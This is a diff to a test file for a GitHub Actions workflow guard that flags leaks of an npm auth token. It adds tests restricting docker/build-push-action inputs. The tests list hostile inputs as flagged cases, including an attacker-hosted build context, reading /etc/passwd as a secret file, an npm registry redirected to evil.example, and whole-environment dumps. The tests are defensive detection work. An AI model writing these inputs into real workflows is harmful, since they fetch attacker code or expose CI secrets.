@@ -55,7 +55,7 @@ describe('workflow token guard on fixtures', () => {
   });
 
   it('fails on the token in with:', () => {
-    expect(fixture('token-in-with.yml')).toEqual(['with']);
+    expect(fixture('token-in-with.yml')).toEqual(['action-with', 'with']);
   });
 
   it('fails on a GITHUB_ENV export of the token', () => {
@@ -139,8 +139,8 @@ describe('workflow token guard on adversarial fixtures', () => {
     ['b14-container-job.yml', ['job-key']],
     ['b15-job-coordinator-repo.yml', ['scope-env']],
     ['b16-workflow-bash-func.yml', ['scope-env']],
-    ['b17-env-index-in-with.yml', ['all-env']],
-    ['b18-tojson-env-in-with.yml', ['all-env']],
+    ['b17-env-index-in-with.yml', ['action-with', 'all-env']],
+    ['b18-tojson-env-in-with.yml', ['action-with', 'all-env']],
     ['b19-indirect-github-env.yml', ['step-order']],
     ['b20-earlier-github-script.yml', ['step-order']],
     // Round 3 (wk-09b-i2): each one returned [] or another rule before this fix.
@@ -164,12 +164,13 @@ describe('workflow token guard on adversarial fixtures', () => {
     ['e02-setup-node-imposter-sha.yml', ['action-pin']],
     ['e03-build-push-any-sha.yml', ['action-pin', 'token-action']],
     ['e04-script-lines-rebroken.yml', ['run-grammar']],
+    ['e05-build-push-remote-context.yml', ['action-with']],
   ])('%s is flagged %j', (file, expected) => {
     expect(fixture(`adversarial/${file}`)).toEqual(expected);
   });
 
   it('lists a fixture for every case', () => {
-    expect(readdirSync(path.join(FIXTURES, 'adversarial')).length).toBe(52);
+    expect(readdirSync(path.join(FIXTURES, 'adversarial')).length).toBe(53);
   });
 });
 
@@ -278,6 +279,55 @@ describe('pinned script and pinned action on allow-listed build steps', () => {
 });
 
 // D1: only the coordinator entries may run the repo's checkout script; a plain install entry may not.
+// D10: the build action runs the repo's Dockerfile only if its inputs keep the build here.
+describe("the build action's inputs", () => {
+  const build = (w: string): Rule[] => rules(step('Build and push', `uses: docker/build-push-action@${SHA}\n${w}`));
+  const LIVE = [
+    'with:',
+    '  context: .',
+    '  push: true',
+    '  tags: ${{ steps.meta.outputs.tags }}',
+    '  labels: ${{ steps.meta.outputs.labels }}',
+    '  build-args: |',
+    '    VITE_BUILD_ID=${{ steps.meta.outputs.version }}',
+    '  secret-envs: |',
+    '    node_auth_token=NODE_AUTH_TOKEN',
+  ].join('\n');
+
+  it('accepts the inputs the live workflow gives it, and no inputs at all', () => {
+    expect(build(LIVE)).toEqual([]);
+    expect(build('with: {}')).toEqual([]);
+    expect(build('')).toEqual([]);
+  });
+
+  it.each([
+    'context: https://github.com/attacker/x.git',
+    'context: ./e2e',
+    'context: "${{ github.event.inputs.ctx }}"',
+    'file: ./evil.Dockerfile',
+    'build-contexts: x=https://github.com/attacker/x.git',
+    'builder: remote',
+    'secret-files: x=/etc/passwd',
+    'push: "${{ github.event.inputs.push }}"',
+    'build-args: NPM_CONFIG_REGISTRY=https://evil.example',
+    'build-args: |\n    VITE_BUILD_ID=${{ steps.meta.outputs.version }}\n    NPM_CONFIG_REGISTRY=https://evil.example',
+    'secret-envs: x=NODE_AUTH_TOKEN',
+    'secret-envs: |\n    node_auth_token=NODE_AUTH_TOKEN\n    home=HOME',
+  ])('flags with: %s', (input) => {
+    expect(build(`with:\n  ${input}`)).toEqual(['action-with']);
+  });
+
+  it('flags with: as one expression or a list', () => {
+    expect(build('with: ${{ fromJSON(vars.BUILD) }}')).toEqual(['action-with']);
+    expect(build('with:\n  - context: .')).toEqual(['action-with']);
+  });
+
+  it('judges the inputs only at the pinned action', () => {
+    expect(build('with:\n  context: .')).toEqual([]);
+    expect(rules(step('Build and push', 'uses: docker/build-push-action@v7\nwith:\n  file: x'))).toEqual(['action-pin', 'token-action']);
+  });
+});
+
 describe('the coordinator checkout on its own entries', () => {
   const checkout = (run: string): Rule[] => rules(step('Fetch the coordinator', `run: ${JSON.stringify(run)}`));
 
@@ -320,7 +370,7 @@ describe('token references, case-insensitive', () => {
     '${{ env.node_auth_token }}',
     "${{ env['NODE_AUTH_TOKEN'] }}",
   ])('flags %s in with: even on the allowed-action step', (ref) => {
-    expect(rules(step('Build and push', `uses: docker/build-push-action@${SHA}\nwith:\n  token: ${JSON.stringify(ref)}`))).toEqual(['with']);
+    expect(rules(step('Build and push', `uses: docker/build-push-action@${SHA}\nwith:\n  tags: ${JSON.stringify(ref)}`))).toEqual(['with']);
   });
 
   it.each(['echo $NODE_AUTH_TOKEN', 'echo ${NODE_AUTH_TOKEN}', 'echo $node_auth_token', 'echo ${{ secrets.NODE_AUTH_TOKEN }}'])(
@@ -658,19 +708,19 @@ describe('secrets and env refs that name one entry, and the rest', () => {
   it.each(['${{ env.FC_WEB_IMAGE }}', "${{ env['FC_WEB_IMAGE'] }}", "${{ ENV[ 'fc-x' ] }}", 'node_auth_token=NODE_AUTH_TOKEN', 'envs', 'MY_ENV', '${{ env._X }}'])(
     'accepts %s in with: on the token action step',
     (ref) => {
-      expect(rules(step('Build and push', `uses: docker/build-push-action@${SHA}\nwith:\n  x: ${JSON.stringify(ref)}`))).toEqual([]);
+      expect(rules(step('Build and push', `uses: docker/build-push-action@${SHA}\nwith:\n  labels: ${JSON.stringify(ref)}`))).toEqual([]);
     },
   );
 
   it.each(['${{ toJSON(env) }}', '${{ toJSON(ENV) }}', '${{ toJSON(env.*) }}', '${{ env.* }}', "${{ env[format('NODE_{0}', 'AUTH_TOKEN')] }}", '${{ env [matrix.k] }}', '${{ env.A.* }}', '${{ env.AB.* }}', '${{ env.9 }}'])(
     'flags %s in with: on the token action step as the whole env',
     (ref) => {
-      expect(rules(step('Build and push', `uses: docker/build-push-action@${SHA}\nwith:\n  x: ${JSON.stringify(ref)}`))).toEqual(['all-env']);
+      expect(rules(step('Build and push', `uses: docker/build-push-action@${SHA}\nwith:\n  labels: ${JSON.stringify(ref)}`))).toEqual(['all-env']);
     },
   );
 
-  it('reads values, not keys: a with: input named env is not a ref', () => {
-    expect(rules(step('Build and push', `uses: docker/build-push-action@${SHA}\nwith:\n  env: production`))).toEqual([]);
+  it('reads values, not keys: a with: input named env is not a ref (only an input the build action may not take)', () => {
+    expect(rules(step('Build and push', `uses: docker/build-push-action@${SHA}\nwith:\n  env: production`))).toEqual(['action-with']);
   });
 
   it('flags an env dump in an if: on the token step, and leaves it alone on a step without the token', () => {
